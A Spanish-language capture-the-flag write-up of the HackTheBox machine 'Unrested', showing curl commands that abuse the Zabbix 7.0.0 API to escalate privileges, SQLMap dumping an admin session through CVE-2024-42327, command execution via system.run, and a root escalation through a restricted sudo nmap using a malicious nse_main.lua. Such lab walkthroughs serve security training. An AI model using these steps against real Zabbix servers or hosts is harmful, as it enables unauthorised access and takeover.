---
layout: default
---
![image](../../Imágenes%20Máquinas/UNRESTED.jpg)


# UNRESTED [HACKTHEBOX] / Medium
### (CVE-2024-42327 SQLI exploitation, CVE-2024-36467 Broken Access Control, Abusing nmap sudoers privilege, Use of SQLMap, API Enumeration, API Broken Access Abuse, API Remote Code Execution (RCE), Bypassing restricted Nmap binary)

#### - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

# Nmap Scan

```bash
PORT      STATE SERVICE             REASON         VERSION
22/tcp    open  ssh                 syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp    open  http                syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
10050/tcp open  tcpwrapped          syn-ack ttl 63
10051/tcp open  ssl/zabbix-trapper? syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nos encontramos 4 puertos abiertos:

- **22**
- **80**
- **10050**
- **10051**

# API Enumeration

Si nos metemos en la web, vemos un panel de login, en el cual nos identificamos utilizando las credenciales que nos da hackthebox (matthew:96qzn0h2e1k3). Si nos fijamos en el panel, nos da una versión de la aplicación (7.0.0):

![image](Pasted_image_20250413161301.png)

Con esto ya podemos buscar algo de información en google, poniendo "zabixx 7.0.0 exploit", ya nos encontramos bastante información. Por ejemplo, si miramos un par de artículos ya vemos que la vulnerabilidad se detalla también en el soporte oficial de Zabbix ('https://support.zabbix.com/browse/ZBX-25623'), en ese artículo nos detallan brevemente de que se trata la vulnerabilidad.

Si volvemos a la web, vemos que en el apartado de "User settings" podemos crear un API Token. Para no estar todo el rato creando nuevos API Token, vamos a estipular uno que nos dure siempre:

![image](Pasted_image_20250413162139.png)

![image](Pasted_image_20250413162219.png)

Ahora ya podemos utilizar la API sin tener que pasar nuestro usuario y contraseña constantemente. Siguiendo la [documentación de la API](https://www.zabbix.com/documentation/7.0/en/manual/api/reference/), vamos a intentar cambiar el nombre de nuestro usuario actual usando el parámetro "user.update". Tal y como vemos en la documentación, necesitamos nuestro id antes, el cual lo podemos conseguir con la función "user.checkAuthentication":

![image](Pasted_image_20250413163313.png)

```bash
curl -s -X POST -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0", "method": "user.checkAuthentication", "params":{"token": "f2a563bbb19368d87e93a8557032d9839f5ad9a7de8d22002fcae9577496deb7"}, "id": 1}' http://10.10.11.50/zabbix/api_jsonrpc.php | jq
```

Esto nos da el resultado esperado, tenemos el id número 3:

``` json
{
  "jsonrpc": "2.0",
  "result": {
    "userid": "3",
    "username": "matthew",
    "name": "Matthew",
    "surname": "Smith",
    "url": "",
    "autologin": "1",
    "autologout": "0",
    "lang": "en_US",
    "refresh": "30s",
    "theme": "default",
    "attempt_failed": "0",
    "attempt_ip": "10.10.14.146",
    "attempt_clock": "1744552483",
    "rows_per_page": "50",
    "timezone": "system",
    "roleid": "1",
    "userdirectoryid": "0",
    "ts_provisioned": "0",
    "debug_mode": 0,
    "deprovisioned": false,
    "gui_access": 0,
    "mfaid": 0,
    "auth_type": 0,
    "type": 1,
    "userip": "10.10.14.146"
  },
  "id": 1
}
```

Vemos que nuestro nombre y apellido es "Matthew Smith", vamos a ver si lo podemos cambiar con la función "user.update":

```json
curl -s -X POST -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0", "method": "user.update", "params":{"userid": "3", "name": "Samu", "surname": "Crow"},"auth": "f2a563bbb19368d87e93a8557032d9839f5ad9a7de8d22002fcae9577496deb7","id": 1}' http://10.10.11.50/zabbix/api_jsonrpc.php | jq
```

Nos da un output correcto, ahora repetimos el comando de antes a ver si se nos cambió el nombre y vemos que si:

![image](Pasted_image_20250413163903.png)

# API Privilege Escalation

Si investigamos un poco la documentación de la API vemos que hay muchas formas de escalar nuestros privilegios para ser administrador. Yo en mi caso voy a meter al usuario matthew en el grupo de los administradores. 

En la documentación de la API vemos que necesitamos utilizar el parámetro "usrgrps" junto con un array que contenga el usrgrpid, que es el ID del grupo que queremos meternos. Como no sabemos ni tenemos forma aparente de conseguir ese ID, voy a probar con el número 1 que es el más evidente:

```bash
curl -s -X POST -H 'Content-Type: application/json-rpc' -d '{"jsonrpc": "2.0", "method": "user.update", "params":{"userid": "3", "usrgrps": [{"usrgrpid": 1}]}, "auth": "f2a563bbb19368d87e93a8557032d9839f5ad9a7de8d22002fcae9577496deb7", "id": 1}' http://10.10.11.50/zabbix/api_jsonrpc.php | jq
```

Pero vemos que nos da un error. Como no tenemos forma aparente de saber el ID del grupo de administradores, vamos a meternos en todos los grupos haciendo fuerza bruta utilizando un bucle for. Tendríamos que escapar todas las comillas de la data en json, para ello he utilizado una [web que convierte json a string](https://dadroit.com/json-to-string/):

```bash
for i in {0..50}; do solicitud=$(curl -s -X POST -H 'Content-Type: application/json-rpc' -d "{\"jsonrpc\": \"2.0\", \"method\": \"user.update\", \"params\":{\"userid\": \"3\", \"usrgrps\": [{\"usrgrpid\": $i}]}, \"auth\": \"f2a563bbb19368d87e93a8557032d9839f5ad9a7de8d22002fcae9577496deb7\", \"id\": 1}" http://10.10.11.50/zabbix/api_jsonrpc.php); [[ $solicitud != *\"error\"* ]] && echo -e "\n[+] Añadido al grupo con ID '$i'"; done
```

Si ejecutamos esto, nos añade a todos los grupos que hay del 0 al 50:

![image](Pasted_image_20250413171307.png)

Ahora, basándonos en la documentación, podemos ver todos los usuarios y toda la información de cada uno:

```bash
curl -s -X POST -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0", "method": "user.get", "params":{"output": "extend", "getAccess": true, "selectMedias": "extend", "selectMediatypes": "extend", "selectUsrgrps": "extend", "selectRole": "extend"}, "auth": "f2a563bbb19368d87e93a8557032d9839f5ad9a7de8d22002fcae9577496deb7", "id": 1}' http://10.10.11.50/zabbix/api_jsonrpc.php | jq
```

Y nos saca el resultado con todos los usuarios:

```json
{
  "jsonrpc": "2.0",
  "result": [
    {
      "userid": "1",
      "username": "Admin",
      "name": "Zabbix",
      "surname": "Administrator",
      "url": "",
      "autologin": "1",
      "autologout": "0",
      "lang": "default",
      "refresh": "30s",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50",
      "timezone": "default",
      "roleid": "3",
      "userdirectoryid": "0",
      "ts_provisioned": "0",
      "gui_access": "1",
      "debug_mode": "0",
      "users_status": "0",
      "usrgrps": [
        {
          "usrgrpid": "13",
          "name": "Internal",
          "gui_access": "1",
          "users_status": "0",
          "debug_mode": "0",
          "userdirectoryid": "0",
          "mfa_status": "0",
          "mfaid": "0"
        }
      ],
      "medias": [],
      "mediatypes": [],
      "role": {
        "roleid": "3",
        "name": "Super admin role",
        "type": "3",
        "readonly": "1"
      }
    },
    {
      "userid": "2",
      "username": "guest",
      "name": "",
      "surname": "",
      "url": "",
      "autologin": "0",
      "autologout": "15m",
      "lang": "default",
      "refresh": "30s",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50",
      "timezone": "default",
      "roleid": "4",
      "userdirectoryid": "0",
      "ts_provisioned": "0",
      "gui_access": "1",
      "debug_mode": "0",
      "users_status": "1",
      "usrgrps": [
        {
          "usrgrpid": "13",
          "name": "Internal",
          "gui_access": "1",
          "users_status": "0",
          "debug_mode": "0",
          "userdirectoryid": "0",
          "mfa_status": "0",
          "mfaid": "0"
        }
      ],
      "medias": [],
      "mediatypes": [],
      "role": {
        "roleid": "4",
        "name": "Guest role",
        "type": "1",
        "readonly": "0"
      }
    },
    {
      "userid": "3",
      "username": "matthew",
      "name": "Samu",
      "surname": "Crow",
      "url": "",
      "autologin": "1",
      "autologout": "0",
      "lang": "default",
      "refresh": "30s",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "10.10.14.146",
      "attempt_clock": "1744552483",
      "rows_per_page": "50",
      "timezone": "default",
      "roleid": "1",
      "userdirectoryid": "0",
      "ts_provisioned": "0",
      "gui_access": "1",
      "debug_mode": "0",
      "users_status": "0",
      "usrgrps": [
        {
          "usrgrpid": "13",
          "name": "Internal",
          "gui_access": "1",
          "users_status": "0",
          "debug_mode": "0",
          "userdirectoryid": "0",
          "mfa_status": "0",
          "mfaid": "0"
        }
      ],
      "medias": [],
      "mediatypes": [],
      "role": {
        "roleid": "1",
        "name": "User role",
        "type": "1",
        "readonly": "0"
      }
    }
  ],
  "id": 1
}
```

Ahora que ya somos administradores, vamos a explotar la vulnerabilidad de SQLI que tiene Zabbix en su versión 7.0.0, esto podemos encontrarlo buscando "Zabbix 7.0.0 github exploit" en la web. Yo en mi caso he encontrado un [repositorio que explota esta vulnerabilidad](https://github.com/watchdog1337/CVE-2024-42327_Zabbix_SQLI).  Vemos que lo que se explota es el parámetro "selectRole":

![image](Pasted_image_20250413182039.png)

Si ponemos el payload que está usando, vemos que nos lista los hashes de todos los usuarios, pero no podemos crackear ninguno. Como sabemos que el parámetro vulnerable es "selectRole", cuando le pasamos el payload de una manera determinada, vamos a ponerlo en Caido para poder pasárselo a SQLMap:

![image](Pasted_image_20250413182729.png)

SQLMap detecta los asteriscos dentro del json para hacer la inyección, así que nos copiamos la solicitud entera y la pegamos en un archivo, acto seguido se la pasamos a SQLMap con el parámetro `-r` y `--dbs` para que nos saque las bases de datos:

![image](Pasted_image_20250413183037.png)

```bash
sqlmap -r archivo_sqli --dbs
```

Es importante que pongamos bien las opciones cuando nos lo pregunta el programa:

![image](Pasted_image_20250413183307.png)

Una vez realizado el ataque, nos da las 2 bases de datos existentes junto con el payload utilizado:

![image](Pasted_image_20250413183348.png)

Ahora, utilizando los parámetros `-D` para especificar una base de datos a usar y `--tables` para buscar tablas dentro de esa base de datos, nos saca un montón de tablas, entre ellas una llamada "sessions", que es la que nos interesa, con SQLMap, vamos a dumpearla en nuestra máquina atacante para poder ver su contenido:

```bash
sqlmap -r archivo_sqli -D "zabbix" -T "sessions" --dump
```

Nos dumpea un sessionid del usuario administrador:

![image](Pasted_image_20250413191116.png)

Ahora con esto ya podemos ejecutar peticiones a la web como administrador:

```bash
curl -s -X POST -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0", "method": "user.checkAuthentication", "params":{"sessionid": "11f25fd4b82d863cfd26519405b05a0c"}, "id": 1}' http://10.10.11.50/zabbix/api_jsonrpc.php | jq
```

Esto nos devuelve la información del usuario administrador:

![image](Pasted_image_20250413184838.png)

# Remote Control Execution (RCE)

Como somos capaces de usar la API como administrador, podemos crear un item y, gracias a la utilidad que tiene Zabbix de `system.run`, podríamos ser capaces de ejecutar comandos de forma remota y conseguir una shell, para ver como podemos crear un item, nos vamos al apartado de la [documentación de la API sobre creación de items](https://www.zabbix.com/documentation/7.0/en/manual/api/reference/item/create):

![image](Pasted_image_20250413190319.png)

Vemos que para crear un item necesitamos antes un "hostid" y un "interfaceid", para conseguir el hostid simplemente tendríamos que irnos al [apartado de la documentación que trata sobre obtener los hosts](https://www.zabbix.com/documentation/7.0/en/manual/api/reference/host/get):

```bash
curl -s -X POST -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0", "method": "host.get", "params":{"output": ["hostid"], "selectHostGroups": "extend", "filter": {"host": ["Zabbix server"]}}, "auth": "11f25fd4b82d863cfd26519405b05a0c", "id": 1}' http://10.10.11.50/zabbix/api_jsonrpc.php | jq
```

Esto nos saca por fin el host (`10084`):

![image](Pasted_image_20250413190111.png)

Ahora vamos a obtener el interfaceid, esta vez lo voy a hacer en Caido, vamos a probar con el id 0:

![image](Pasted_image_20250413191337.png)

No nos lista nada, pero si probamos a cambiar el valor de `interfaceids` a "1", vemos que si nos lista nuestro host:

![image](Pasted_image_20250413191505.png)

Una vez tenemos el hostid (`10084`) y el interfaceids (`1`), ya podemos crear un item. Lo que nos interesa es  `system.run`, que lo tenemos que poner en el parámetro de `key_`, donde en la documentación de items está puesta la utilidad `system.uname` a la hora de crear el item.

Si buscamos la sintaxis de esta utilidad por google, vemos una [pregunta de un usuario en un forum de Zabbix](https://www.zabbix.com/forum/zabbix-help/21803-system-run-syntax):

![image](Pasted_image_20250413192530.png)

Vamos a probarlo, vamos a montarnos un servidor web con python e intentar descargar un archivo desde Zabbix:

![image](Pasted_image_20250413194721.png)

Recibimos la reverse shell mediante netcat:

![image](Pasted_image_20250413194818.png)

Una vez hecho el tratamiento de la TTY, nos vamos a /home/matthew/ y tenemos la flag de user.


# PrivEsc

Si hacemos un `sudo -l`, vemos que tenemos privilegios de sudo a la hora de ejecutar cualquier comando de /usr/bin/nmap:

![image](Pasted_image_20250413195255.png)

Si nos vamos a la [web de GTFOBins](https://gtfobins.github.io/), y buscamos por nmap, nos aparece la forma de escalar:

![image](Pasted_image_20250413195557.png)

Pero al ejecutarlo, nos sale un mensaje de error:

```bash
Script mode is disabled for security reasons.
```

Si hacemos un `cat` a /usr/bin/nmap, vemos que es un script restringido que apunta al verdadero nmap, en /usr/bin/nmap.original:

![image](Pasted_image_20250413200335.png)

Para hacer un bypass a esto, solo hay que utilizar el parámetro `--datadir`, y especificarle una ruta para coger los scripts de nmap. Este script restringido no nos deja utilizar muchos de los parámetros de nmap, pero si nos deja ejecutar `-sCV`, que es un conjunto de scripts de reconocimiento que ejecuta nmap por defecto.

Los scripts de nmap están escritos en lua, que es un lenguaje de programación. Si ejecutamos un `find / -name "*.lua" 2>/dev/null | grep "nmap"`, nos salen todos los scripts .lua de nmap. Si hacemos un `ls` en la ruta principal de nmap, vemos que solo hay uno que está ahí, es principal:

![image](Pasted_image_20250413202415.png)

Ahora que tenemos esto claro, vamos a crear un archivo nse_main.lua en /tmp, poniendo como contenido `os.execute("/bin/sh")`, `os.execute("chmod 4755 /bin/bash")` o lo que te apetezca para subir privilegios:

```bash
echo 'os.execute("/bin/bash")' > /tmp/nse_main.lua
```

Una vez creado, le vamos a decir a nmap que el "--datadir" que debe coger es /tmp. Después, hacemos un escaneo a localhost ejecutando un script cualquiera de nmap como root:

![image](Pasted_image_20250413203037.png)

**Pista -> Si la shell no te funciona, simplemente teclea `script /dev/null -c  bash` y listo.**

# ./PWNED
